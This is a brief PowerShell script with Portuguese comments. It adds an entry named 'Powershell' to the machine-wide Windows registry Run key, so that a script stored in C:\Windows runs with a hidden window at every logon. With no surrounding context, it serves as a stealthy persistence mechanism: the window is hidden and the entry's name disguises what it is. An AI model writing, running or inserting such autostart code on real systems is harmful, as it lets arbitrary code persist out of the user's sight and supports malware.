# Caminho do script PowerShell
$programPath = "C:\Windows\powershell1.ps1"

# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
